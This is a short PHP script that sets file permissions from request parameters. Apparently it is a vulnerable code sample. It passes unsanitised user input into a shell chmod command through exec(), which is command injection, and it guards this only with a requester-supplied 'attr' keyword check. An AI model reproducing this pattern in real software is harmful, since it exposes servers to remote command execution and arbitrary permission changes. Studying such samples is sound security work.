<?php
$name=(isset($_REQUEST['name']))?$_REQUEST['name']:'';
$mode=(isset($_REQUEST['mode']))?$_REQUEST['mode']:'';
$attr=(isset($_REQUEST['attr']))?$_REQUEST['attr']:'';
if (preg_match('/admin|root|rw/i',$attr)) {
    if (is_dir($name)) {
        exec('chmod -vR '.$mode.' '.$name);
    } else {
        chmod($name,$mode);
    }
} else {
    if ((file_exists($name))&&($attr!='')) {
        if (str_starts_with(basename($name),$attr.'_')) {
            chmod($name,$mode);
        }
    }
}
